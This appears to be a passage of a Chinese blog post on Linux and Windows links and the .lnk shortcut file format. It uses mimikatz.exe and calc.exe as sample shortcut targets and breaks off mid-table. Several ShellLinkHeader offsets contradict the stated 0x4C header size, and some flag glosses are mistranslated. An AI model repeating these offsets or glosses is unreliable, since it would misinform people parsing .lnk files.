+<h4><span id="213-linux-中的特殊条目">2.1.3 Linux 中的特殊条目</span></h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/tmp]</span><br><span class="line">└─$ cd tmp.6oxI1VVtJD </span><br><span class="line">                                     </span><br><span class="line">┌──(kali㉿kali)-[/tmp/tmp.6oxI1VVtJD]</span><br><span class="line">└─$ ls -ail  </span><br><span class="line">total 8</span><br><span class="line">1703964 drwx------  2 kali kali 4096 May  8 02:06 .</span><br><span class="line">1703937 drwxrwxrwt 17 root root 4096 May  8 02:06 ..</span><br><span class="line">                                    </span><br><span class="line">┌──(kali㉿kali)-[/tmp/tmp.6oxI1VVtJD]</span><br><span class="line">└─$ stat . </span><br><span class="line">  File: .</span><br><span class="line">  Size: 4096            Blocks: 8          IO Block: 4096   directory</span><br><span class="line">Device: 8,1     Inode: 1703964     Links: 2</span><br><span class="line">Access: (0700/drwx------)  Uid: ( 1000/    kali)   Gid: ( 1000/    kali)</span><br><span class="line">Access: 2024-05-08 02:06:18.626527592 -0400</span><br><span class="line">Modify: 2024-05-08 02:06:09.074481132 -0400</span><br><span class="line">Change: 2024-05-08 02:06:09.074481132 -0400</span><br><span class="line"> Birth: 2024-05-08 02:06:09.074481132 -0400</span><br><span class="line">                                       </span><br><span class="line">┌──(kali㉿kali)-[/tmp/tmp.6oxI1VVtJD]</span><br><span class="line">└─$ stat ..</span><br><span class="line">  File: ..</span><br><span class="line">  Size: 4096            Blocks: 8          IO Block: 4096   directory</span><br><span class="line">Device: 8,1     Inode: 1703937     Links: 17</span><br><span class="line">Access: (1777/drwxrwxrwt)  Uid: (    0/    root)   Gid: (    0/    root)</span><br><span class="line">Access: 2024-05-08 02:06:10.010485929 -0400</span><br><span class="line">Modify: 2024-05-08 02:06:09.074481132 -0400</span><br><span class="line">Change: 2024-05-08 02:06:09.074481132 -0400</span><br><span class="line"> Birth: 2024-02-25 13:19:18.308000000 -0500</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[/tmp]</span><br><span class="line">└─$ stat tmp.6oxI1VVtJD </span><br><span class="line">  File: tmp.6oxI1VVtJD</span><br><span class="line">  Size: 4096            Blocks: 8          IO Block: 4096   directory</span><br><span class="line">Device: 8,1     Inode: 1703964     Links: 2</span><br><span class="line">Access: (0700/drwx------)  Uid: ( 1000/    kali)   Gid: ( 1000/    kali)</span><br><span class="line">Access: 2024-05-08 02:06:18.626527592 -0400</span><br><span class="line">Modify: 2024-05-08 02:06:09.074481132 -0400</span><br><span class="line">Change: 2024-05-08 02:06:09.074481132 -0400</span><br><span class="line"> Birth: 2024-05-08 02:06:09.074481132 -0400</span><br></pre></td></tr></table></figure>
+
+<p>​	上述内容可以发现，在我们新建的一个文件夹 tmp.6oxI1VVtJD 中，已经存在了两个隐藏的特殊目录条目，分别是 <strong>“.”<strong>、</strong>“..”</strong> ，分别表示的当前路径和上级路径</p>
+<ul>
+<li><strong><code>.</code></strong> 代表当前目录，它是一个指向自己的硬链接</li>
+<li><strong><code>..</code></strong> 代表当前目录的父目录，它也是一个硬链接，指向其父目录的目录条目</li>
+</ul>
+<p>​	<code>.</code> 和 <code>..</code> 是硬链接，但它们是特殊情况的硬链接，有以下特点：</p>
+<ol>
+<li><p><strong>特殊含义</strong></p>
+<p>​	<code>.</code> 代表当前目录，<code>..</code> 代表当前目录的父目录。这两个特殊的目录条目是 POSIX 标准（Portable Operating System Interface）定义的，它们为文件系统导航提供了一种标准和方便的方式</p>
+</li>
+<li><p><strong>系统创建和管理</strong></p>
+<p>​	这两个硬链接是由文件系统自己创建和管理的。当一个新目录被创建时，文件系统会自动在该目录下创建 <code>.</code> 和 <code>..</code> 条目</p>
+</li>
+<li><p><strong>不允许删除或重命名</strong></p>
+<p>​	不能删除或重命名<code>.</code> 和 <code>..</code> 这两个特殊条目，对于文件系统的正常工作至关重要</p>
+</li>
+<li><p><strong>不计入目录的硬链接数</strong></p>
+<p>​	一个文件或目录的硬链接数不包括 <code>.</code> 和 <code>..</code> 条目。 <code>.</code> 和 <code>..</code> 对于所有目录都是固定的，不反映文件或目录的实际链接数</p>
+</li>
+<li><p><strong>防止循环引用</strong></p>
+<p>​	由于 <code>..</code> 总是指向父目录，它防止了创建指向自身或形成无限循环的目录结构的可能性，这可能会使文件系统陷入混乱</p>
+</li>
+<li><p><strong>简化文件系统操作</strong></p>
+<p>​	<code>.</code> 和 <code>..</code> 的存在简化了许多文件系统操作，如遍历目录树、改变工作目录等</p>
+</li>
+</ol>
+<p>​	总之，<code>.</code> 和 <code>..</code> 是硬链接，但它们是文件系统的一部分，具有特殊的意义和规则。它们被特别允许，因为它们对于文件系统的功能和结构至关重要，并且受到文件系统本身的保护和管理。</p>
+<h3><span id="22-link-windows">2.2 Link (Windows)</span></h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt; mklink --<span class="built_in">help</span></span><br><span class="line">创建符号链接</span><br><span class="line"></span><br><span class="line">MKLINK [[/D] | [/H] | [/J]] Link Target</span><br><span class="line"></span><br><span class="line">        /D      创建目录符号链接。默认为文件</span><br><span class="line">                符号链接。</span><br><span class="line">        /H      创建硬链接，而不是符号链接。</span><br><span class="line">        /J      创建目录联接。</span><br><span class="line">        Link    指定新的符号链接名称。</span><br><span class="line">        Target  指定新链接引用的路径</span><br><span class="line">                (相对或绝对)。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4><span id="221-command-mklink-的使用方法">2.2.1 command: mklink 的使用方法</span></h4><ol>
+<li>Windows Link 文件软链接</li>
+</ol>
+<blockquote>
+<p>mklink 名称 文件路径</p>
+</blockquote>
+<ol start="2">
+<li>Windows Link 文件硬链接</li>
+</ol>
+<blockquote>
+<p>mklink &#x2F;H 名称 文件路径</p>
+</blockquote>
+<ol start="3">
+<li>Windows Link 文件夹软链接</li>
+</ol>
+<blockquote>
+<p>mklink &#x2F;D 名称 文件夹路径</p>
+</blockquote>
+<ol start="4">
+<li>Windows Link 目录联结（硬链接）</li>
+</ol>
+<blockquote>
+<p>mklink &#x2F;J 名称 文件夹路径</p>
+</blockquote>
+<p>​	创建了一个 demo 文件夹，里面存储了一个 mimikatz.exe ，对 mimikatz.exe 创建一个软链接和硬链接</p>
+<p><img src="/images/image-20240508172836629.png" alt="image-20240508172836629"></p>
+<p><img src="/images/image-20240508175501003.png" alt="image-20240508175501003"></p>
+<p>​	对 demo 文件夹进行软链接和硬链接</p>
+<p><img src="/images/image-20240508174117126.png" alt="image-20240508174117126"></p>
+<p><img src="/images/image-20240508175805075.png" alt="image-20240508175805075"></p>
+<h4><span id="222-powershell-mklink-的使用方法">2.2.2 powershell: mklink 的使用方法</span></h4><ol>
+<li>Windows Link 文件软链接</li>
+</ol>
+<blockquote>
+<p>New-Item -ItemType SymbolicLink -Path 名称 -Target 路径</p>
+</blockquote>
+<ol start="2">
+<li>Windows Link 文件硬链接</li>
+</ol>
+<blockquote>
+<p>New-Item -ItemType HardLink -Path 名称 -Target 路径</p>
+</blockquote>
+<ol start="3">
+<li>Windows Link 文件夹软链接</li>
+</ol>
+<blockquote>
+<p>New-Item -ItemType SymbolicLink -Path 名称 -Target 路径</p>
+</blockquote>
+<ol start="4">
+<li>Windows Link 目录联结（硬链接）</li>
+</ol>
+<blockquote>
+<p>mklink &#x2F;J 名称 文件夹路径</p>
+</blockquote>
+<p><img src="/images/image-20240508183439860.png" alt="image-20240508183439860"></p>
+<p><img src="/images/image-20240508183418812.png" alt="image-20240508183418812"></p>
+<p>​	获取详细链接信息：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ChildItem</span> <span class="literal">-Path</span> . <span class="literal">-Recurse</span> <span class="literal">-ErrorAction</span> SilentlyContinue | <span class="built_in">Where-Object</span> &#123; <span class="variable">$_</span>.Attributes <span class="operator">-band</span> [<span class="type">IO.FileAttributes</span>]::ReparsePoint &#125; | <span class="built_in">Format-List</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20240508183716541.png" alt="image-20240508183716541"></p>
+<h1><span id="第二部分-link-amp-快捷方式">第二部分 Link &amp; 快捷方式</span></h1><h2><span id="0-什么是快捷方式lnk-文件">0. 什么是快捷方式（.lnk 文件）？</span></h2><p>​	Shell Link 是一个数据对象，其中包含用于访问 Shell 命名空间中的另一个对象（即通过 Windows 资源管理器可见的任何对象）的信息。 可通过 Shell 链接访问的对象类型包括文件、文件夹、磁盘驱动器和打印机。 Shell 链接允许用户或应用程序从命名空间中的任意位置访问对象。 用户或应用程序<strong>不需要知道对象的当前名称和位置</strong></p>
+<h2><span id="1-lnk-有什么作用">1. Lnk 有什么作用 ？</span></h2><ol>
+<li><p>方便访问</p>
+<p>​	快捷方式允许用户快速启动程序或访问文件和文件夹，无需浏览整个文件系统。</p>
+</li>
+<li><p>位置独立</p>
+<p>​	快捷方式包含了目标对象的完整路径信息，因此即使快捷方式被移动到其他位置，它仍然可以指向原始目标。</p>
+</li>
+<li><p>易于创建和管理</p>
+<p>​	用户可以通过简单的右键菜单操作在Windows资源管理器中创建快捷方式，管理起来非常方便。</p>
+</li>
+<li><p>可包含额外属性</p>
+<p>​	快捷方式文件（.lnk 文件）可以存储额外的属性，如图标、工具提示、快捷键等。</p>
+</li>
+<li><p>易于分享</p>
+<p>​	快捷方式可以被复制或移动到其他计算机上，使得用户可以与他人共享快速访问特定目标的方式。</p>
+</li>
+<li><p>桌面访问</p>
+<p>​	用户经常在桌面上放置快捷方式，以便快速启动程序或访问常用文件夹。</p>
+</li>
+<li><p>组织和分类</p>
+<p>​	快捷方式可以用于组织和分类文件和程序，使得用户可以通过不同的快捷方式集合来访问不同的应用程序或文档。</p>
+</li>
+<li><p>网络资源访问</p>
+<p>​	快捷方式也可以用来指向网络共享或远程资源，使得访问这些资源更加方便。</p>
+</li>
+<li><p>维护一致性</p>
+<p>​	在安装程序或进行系统配置时，可以创建快捷方式以确保用户可以通过一致的方式访问特定的功能或数据。</p>
+</li>
+<li><p>任务自动化</p>
+<p>​	快捷方式可以与批处理文件或脚本结合使用，以自动化复杂的任务或操作序列</p>
+</li>
+</ol>
+<h2><span id="2-怎么创建-lnk">2. 怎么创建 Lnk ？</span></h2><p>​	用户可以通过从对象的快捷菜单中选择“ 创建快捷方式” 命令来创建 Shell Link 。还可以通过应用程序创建和使用  Shell Link 和快捷方式。</p>
+<p><strong>注意2：不能使用 IShellLink 创建指向 URL 的链接</strong></p>
+<p><strong>注意3：如果是用户通过菜单创建的快捷方式，在创建快捷方式后移动或重命名文档，系统将在用户下次选择该快捷方式时尝试更新该快捷方式</strong></p>
+<p><strong>注意4：如果是通过应用程序创建的快捷方式，在创建快捷方式后移动或重命名文档，系统不会自动尝试解析该链接式</strong></p>
+<h2><span id="3-lnk-文件格式解析">3. Lnk 文件格式解析</span></h2><p>​	这里创建两个快捷方式以便对照分析：</p>
+<p>​	一个快捷方式使用的是 <code>mimikatz.exe</code> ，快捷键目标中不使用系统环境变量</p>
+<p><img src="/images/image-20240510101330163.png" alt="image-20240510101330163"></p>
+<p>​	另一个快捷方式使用的是 <code>calc.exe</code> ，快捷键目标中将 <code>C:\windows\system32</code> 修改为系统环境变量 <code>%windir%</code></p>
+<p><img src="/images/image-20240510101458283.png" alt="image-20240510101458283"></p>
+<p>​	将样本分别放入静态 HEX 编辑器（具体分析请查看参考文献 [7] ）</p>
+<p><img src="/images/image-20240510092054632.png" alt="image-20240510092054632"></p>
+<p>**注意5：新版本 <code>010 editor</code> 能够在文件拖入是识别出快捷方式或是二进制文件。可以通过直接下载 <code>010 editor</code> 提供 的插件进行更加便捷的分析 **</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.lnk 文件格式</span><br><span class="line"><span class="code">             +---------------------------+</span></span><br><span class="line"><span class="code">             | lnk file header           |     </span></span><br><span class="line"><span class="code">             +---------------------------+ &gt;------.</span></span><br><span class="line"><span class="code">             | Shell Item Id List        |        |</span></span><br><span class="line"><span class="code">             +---------------------------+        |</span></span><br><span class="line"><span class="code">             | File location info        |        |</span></span><br><span class="line"><span class="code">             +---------------------------+        |</span></span><br><span class="line"><span class="code">             | Description string        |        |</span></span><br><span class="line"><span class="code">             +---------------------------+       ---</span></span><br><span class="line"><span class="code">             | Relative path string      |  这几个节不是每一个都必须存在，如果存在就要按这样的顺序关系排列。</span></span><br><span class="line"><span class="code">             +---------------------------+       ---</span></span><br><span class="line"><span class="code">             | Working directory string  |        |</span></span><br><span class="line"><span class="code">             +---------------------------+        |</span></span><br><span class="line"><span class="code">             | Command line string       |        |</span></span><br><span class="line"><span class="code">             +---------------------------+        |</span></span><br><span class="line"><span class="code">             | Icon filename string      |        |</span></span><br><span class="line"><span class="code">             +---------------------------+ &gt;------.</span></span><br><span class="line"><span class="code">             | Extra stuff               |</span></span><br><span class="line"><span class="code">             +---------------------------+</span></span><br></pre></td></tr></table></figure>
+
+<h3><span id="31-shelllinkheader">3.1 ShellLinkHeader</span></h3><p><img src="/images/image-20240510102632714.png" alt="image-20240510102632714"></p>
+<p><img src="/images/image-20240510102536439.png" alt="image-20240510102536439"></p>
+<ul>
+<li>HeaderSize(4 bytes, <code>offset 0x00</code>)：0x0000004C ，相当于字符”L”，用于标识是否是个有效的.lnk文件，ShellLinkHeader 头大小</li>
+<li>LinkCLSID(16 bytes, <code>offset 0x04</code>)：00021401-0000-0000-C000-000000000046，GUID，标识.lnk的唯一标识符</li>
+<li>sLinkFlags(4 bytes，offset 0x14)：Flags 用来标识.lnk文件中有哪些可选属性</li>
+<li>FileAttributes (4 bytes，offset 0x18)：目标文件属性</li>
+<li>CreationTime（8 bytes，offset 0x1c）：一个FILETIME 结构（[MS-DTYP]第 2.3.3 节），指定UTC（协调世界时） 格式的链接目标的创建时间。如果该值为零，则表示链接目标上没有设置创建时间。</li>
+<li>AccessTime（8 bytes，offset 0x24）： FILETIME 结构（[MS-DTYP] 第 2.3.3 节），指定 UTC（协调世界时）中的链接目标的访问时间。如果该值为零，则链接目标上没有设置访问时间。</li>
+<li>WriteTime（8 bytes，offset 0x3c）： FILETIME 结构（[MS-DTYP] 第 2.3.3 节），指定 UTC（协调世界时）中的链接目标的写入时间。如果该值为零，则链接目标上没有设置写入时间。</li>
+<li>FileSize（4 bytes，offset 0x44）：一个 32 位无符号整数，指定链接目标的大小（以字节为单位）。如果链接目标文件大于 0xFFFFFFFF，则该值指定链接目标文件大小的最低有效 32 位。</li>
+<li>IconIndex（4 bytes，offset 0x48）：一个 32 位有符号整数，指定给定图标位置内图标的索引</li>
+<li>ShowCommand（4 bytes，offset 0x4c）：一个 32 位无符号整数，指定由链接启动的应用程序的预期窗口状态</li>
+<li>HotKey（2 bytes，offset 0x50）：HotKeyFlags结构，指定用于启动快捷键引用的应用程序的击键</li>
+</ul>
+<h4><span id="311-slinkflags">3.1.1 sLinkFlags</span></h4><p>​	（具体 Flag 标志相关信息请查看参考文献 [8] ）</p>
+<p><img src="/images/image-20240510103244322.png" alt="image-20240510103244322"></p>
+<table>
+<thead>
+<tr>
+<th align="left">Value</th>
+<th align="left">Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">A<br>HasLinkTargetIDList</td>
+<td align="left">The shell link is saved with an <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/ac7b5968-68f5-4e5c-8b11-00a6f4ae98ff#gt_ae01eca8-1cd4-4472-8be6-bd5d3ab4d01c">item ID list (IDList)</a>. If this bit is set, a <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/881d7a83-07a5-4702-93e3-f9fc34c3e1e4">LinkTargetIDList</a> structure (section 2.2) MUST follow the ShellLinkHeader. If this bit is not set, this structure MUST NOT be present.<br>shell 链接与item ID 列表 (IDList)，如果设置了该位，则LinkTargetIDList 结构存在</td>
+</tr>
+<tr>
+<td align="left">B<br>HasLinkInfo</td>
+<td align="left">The shell link is saved with link information. If this bit is set, a <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/6813269d-0cc8-4be2-933f-e96e8e3412dc">LinkInfo</a> structure (section 2.3) MUST be present. If this bit is not set, this structure MUST NOT be present.<br>shell 链接与链接信息一起保存，如果设置了该位，则LinkInfo结构存在</td>
+</tr>
+<tr>
+<td align="left">C<br>HasName</td>
+<td align="left">The shell link is saved with a name string. If this bit is set, a <strong>NAME_STRING</strong> <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/17b69472-0f34-4bcf-b290-eccdb8de224b">StringData</a> structure (section 2.4) MUST be present. If this bit is not set, this structure MUST NOT be present.<br>shell 链接与名称字符串一起保存，如果设置了该位，则StringData结构必须存在NAME_STRING</td>
+</tr>
+<tr>
+<td align="left">D<br>HasRelativePath</td>
+<td align="left">The shell link is saved with a <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/ac7b5968-68f5-4e5c-8b11-00a6f4ae98ff#gt_f0a8c9c7-1368-4989-addb-4792c3206387">relative path</a> string. If this bit is set, a <strong>RELATIVE_PATH</strong> StringData structure (section 2.4) MUST be present. If this bit is not set, this structure MUST NOT be present.<br>shell 链接使用相对路径字符串保存。如果设置了该位，则StringData 结构必须存在RELATIVE_PATH</td>
+</tr>
+<tr>
+<td align="left">E<br>HasWorkingDir</td>
+<td align="left">The shell link is saved with a working directory string. If this bit is set, a <strong>WORKING_DIR</strong> StringData structure (section 2.4) MUST be present. If this bit is not set, this structure MUST NOT be present.<br>shell 链接与工作目录字符串一起保存。如果设置了该位，则StringData 结构必须存在WORKING_DIR</td>
+</tr>
+<tr>
+<td align="left">F<br>HasArguments</td>
+<td align="left">The shell link is saved with command line arguments. If this bit is set, a <strong>COMMAND_LINE_ARGUMENTS</strong> StringData structure (section 2.4) MUST be present. If this bit is not set, this structure MUST NOT be present..<br>shell 链接与命令行参数一起保存。如果设置了该位，则StringData 结构必须存在COMMAND_LINE_ARGUMENTS</td>
+</tr>
+<tr>
+<td align="left">G<br>HasIconLocation</td>
+<td align="left">The shell link is saved with an icon location string. If this bit is set, an <strong>ICON_LOCATION</strong> StringData structure (section 2.4) MUST be present. If this bit is not set, this structure MUST NOT be present.<br>shell 链接与工作目录字符串一起保存。如果设置了该位，则ICON_LOCATION 结构必须存在WORKING_DIR</td>
+</tr>
+<tr>
+<td align="left">H<br>IsUnicode</td>
+<td align="left">The shell link contains Unicode encoded strings. This bit SHOULD be set. If this bit is set, the StringData section contains Unicode-encoded strings; otherwise, it contains strings that are encoded using the system default code page..<br>shell 链接与工作目录字符串一起保存。如果设置了该位，则StringData 结构必须包含 Unicode 编码的字符串</td>
+</tr>
+<tr>
+<td align="left">I<br>ForceNoLinkInfo</td>
+<td align="left">The LinkInfo structure (section 2.3) is ignored.</td>
+</tr>
+<tr>
+<td align="left">J<br>HasExpString</td>
+<td align="left">The shell link is saved with an <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/2224d03c-f417-44a0-81e3-df169938ba72">EnvironmentVariableDataBlock (section 2.5.4)</a>.<br>shell 链接使用 EnvironmentVariableDataBlock 保存</td>
+</tr>
+<tr>
+<td align="left">K<br>RunInSeparateProcess</td>
+<td align="left">The target is run in a separate virtual machine when launching a <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/ac7b5968-68f5-4e5c-8b11-00a6f4ae98ff#gt_3b9c7b80-c157-438a-b53a-dbe935ec3243">link target</a> that is a 16-bit application.</td>
+</tr>
+<tr>
+<td align="left">L<br>Unused1</td>
+<td align="left">A bit that is undefined and MUST be ignored.</td>
+</tr>
+<tr>
+<td align="left">M<br>HasDarwinID</td>
+<td align="left">The shell link is saved with a <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/48f8a4c4-99fe-4787-a39f-b1367103eba8">DarwinDataBlock (section 2.5.3)</a>.</td>
+</tr>
+<tr>
+<td align="left">N<br>RunAsUser</td>
+<td align="left">The application is run as a different user when the target of the shell link is activated. <br>当 shell 链接的目标被激活时，应用程序将以不同的用户身份运行</td>
+</tr>
+<tr>
+<td align="left">O<br>HasExpIcon</td>
+<td align="left">The shell link is saved with an <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/9e6b7dfe-2ca2-4875-a0c9-8d75ee4f9b65">IconEnvironmentDataBlock (section 2.5.5)</a>.</td>
+</tr>
+<tr>
+<td align="left">P<br>NoPidlAlias</td>
+<td align="left">The file system location is represented in the shell <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/ac7b5968-68f5-4e5c-8b11-00a6f4ae98ff#gt_165fda5c-ed85-42c2-bd8c-1bbbde70cee9">namespace</a> when the path to an item is parsed into an IDList.</td>
+</tr>
+<tr>
+<td align="left">Q<br>Unused2</td>
+<td align="left">A bit that is undefined and MUST be ignored.</td>
+</tr>
+<tr>
+<td align="left">R<br>RunWithShimLayer</td>
+<td align="left">The shell link is saved with a <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/bde812e5-5af0-4db9-a7e3-4a46e91c873a">ShimDataBlock (section 2.5.8)</a>.</td>
+</tr>
+<tr>
+<td align="left">S<br>ForceNoLinkTrack</td>
+<td align="left">The <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/df8e3748-fba5-4524-968a-f72be06d71fc">TrackerDataBlock (section 2.5.10)</a> is ignored.</td>
+</tr>
+<tr>
+<td align="left">T<br>EnableTargetMetadata</td>
+<td align="left">The shell link attempts to collect target properties and store them in the <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/36463387-0708-40f6-a3a5-452fe42be585">PropertyStoreDataBlock (section 2.5.7)</a> when the link target is set.</td>
+</tr>
+<tr>
+<td align="left">U<br>DisableLinkPathTracking</td>
+<td align="left">The EnvironmentVariableDataBlock is ignored.</td>
+</tr>
+<tr>
+<td align="left">V<br>DisableKnownFolderTracking</td>
+<td align="left">The <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/8833199d-fc03-4535-8011-ba36c4b3ad5f">SpecialFolderDataBlock (section 2.5.9)</a> and the <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/5c7410e4-ec19-4ec5-8fff-cf4ccc46c5b6">KnownFolderDataBlock (section 2.5.6)</a> are ignored when loading the shell link. If this bit is set, these extra data blocks SHOULD NOT be saved when saving the shell link.</td>
+</tr>
+<tr>
+<td align="left">W<br>DisableKnownFolderAlias</td>
+<td align="left">If the <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/ac7b5968-68f5-4e5c-8b11-00a6f4ae98ff#gt_6cfb1417-9127-43fa-ad5b-1ddcc3d270a5">link</a> has a KnownFolderDataBlock (section 2.5.6), the unaliased form of the known folder IDList SHOULD be used when translating the target IDList at the time that the link is loaded.</td>
+</tr>
+<tr>
+<td align="left">X<br>AllowLinkToLink</td>
+<td align="left">Creating a link that references another link is enabled. Otherwise, specifying a link as the target IDList SHOULD NOT be allowed.</td>
+</tr>
+<tr>
+<td align="left">Y<br>UnaliasOnSave</td>
+<td align="left">When saving a link for which the target IDList is under a known folder, either the unaliased form of that known folder or the target IDList SHOULD be used.</td>
+</tr>
+<tr>
+<td align="left">Z<br>PreferEnvironmentPath</td>
+<td align="left">The target IDList SHOULD NOT be stored; instead, the path specified in the EnvironmentVariableDataBlock (section 2.5.4) SHOULD be used to refer to the target.</td>
+</tr>
+<tr>
+<td align="left">AA<br>KeepLocalIDListForUNCTarget</td>
+<td align="left">When the target is a <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/ac7b5968-68f5-4e5c-8b11-00a6f4ae98ff#gt_c9507dca-291d-4fd6-9cba-a9ee7da8c908">UNC</a> name that refers to a location on a local machine, the local path IDList in the PropertyStoreDataBlock (section 2.5.7) SHOULD be stored, so it can be used when the link is loaded on the local machine.</td>
+</tr>
+</tbody></table>
+<h5><span id="3111-calcexe-快捷键-shelllinkheader-linkflags-包含项">3.1.1.1 Calc.exe 快捷键 ShellLinkHeader LinkFlags 包含项</span></h5><p><img src="/images/image-20240510103018199.png" alt="image-20240510103018199"></p>
+<p>​	由上可以看到，该文件LinkFlags为0x000802DB(Bin：0000 0000 0000 0100 0000 0010 1101 1011)，这表示以下Flag被设置：</p>
+<ul>
+<li>HasLinkTargetIDList</li>
+<li>HasLinkInfo</li>
+<li>HasRelativePath</li>
+<li>HasWorkingDir</li>
+<li>HasIconLocation</li>
+<li>IsUnicode</li>
+<li>HasExpIcon</li>
+<li>EnableTargetMetadata</li>
+</ul>
+<h4><span id="312-sfileattributes">3.1.2 sFileAttributes</span></h4><p>​	（具体 Flag 标志相关信息请查看参考文献 [8] ）</p>
+<p><img src="/images/image-20240510123034445.png" alt="image-20240510123034445"></p>
+<table>
+<thead>
+<tr>
+<th align="left">Value</th>
+<th align="left">Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">A<br>FILE_ATTRIBUTE_READONLY</td>
+<td align="left">The file or directory is read-only. For a file, if this bit is set, applications can read the file but cannot write to it or delete it. For a directory, if this bit is set, applications cannot delete the directory.<br>文件或目录是只读的</td>
+</tr>
+<tr>
+<td align="left">B<br>FILE_ATTRIBUTE_HIDDEN</td>
+<td align="left">The file or directory is hidden. If this bit is set, the file or folder is not included in an ordinary directory listing.<br>文件或目录被隐藏</td>
+</tr>
+<tr>
+<td align="left">C<br>FILE_ATTRIBUTE_SYSTEM</td>
+<td align="left">The file or directory is part of the operating system or is used exclusively by the operating system.<br>文件或目录是操作系统的一部分或者由操作系统专用</td>
+</tr>
+<tr>
+<td align="left">D<br>Reserved1</td>
+<td align="left">A bit that MUST be zero.</td>
+</tr>
+<tr>
+<td align="left">E<br>FILE_ATTRIBUTE_DIRECTORY</td>
+<td align="left">The link target is a directory instead of a file.<br>链接目标是目录而不是文件</td>
+</tr>
+<tr>
+<td align="left">F<br>FILE_ATTRIBUTE_ARCHIVE</td>
+<td align="left">The file or directory is an archive file. Applications use this flag to mark files for backup or removal.<br>文件或目录是存档文件。应用程序使用此标志来标记要备份或删除的文件</td>
+</tr>
+<tr>
+<td align="left">G<br>Reserved2</td>
+<td align="left">A bit that MUST be zero.</td>
+</tr>
+<tr>
+<td align="left">H<br>FILE_ATTRIBUTE_NORMAL</td>
+<td align="left">The file or directory has no other flags set. If this bit is 1, all other bits in this structure MUST be clear.</td>
+</tr>
+<tr>
+<td align="left">I<br>FILE_ATTRIBUTE_TEMPORARY</td>
+<td align="left">The file is being used for temporary storage.</td>
+</tr>
+<tr>
+<td align="left">J<br>FILE_ATTRIBUTE_SPARSE_FILE</td>
+<td align="left">The file is a <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/ac7b5968-68f5-4e5c-8b11-00a6f4ae98ff#gt_57c7faf0-6002-4b1a-b8fc-fc9244d5a6e5">sparse file</a>.</td>
+</tr>
+<tr>
+<td align="left">K<br>FILE_ATTRIBUTE_REPARSE_POINT</td>
+<td align="left">The file or directory has an associated <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/ac7b5968-68f5-4e5c-8b11-00a6f4ae98ff#gt_4fed0b53-5fc8-4818-886f-93d87f3035e1">reparse point</a>.</td>
+</tr>
+<tr>
+<td align="left">L<br>FILE_ATTRIBUTE_COMPRESSED</td>
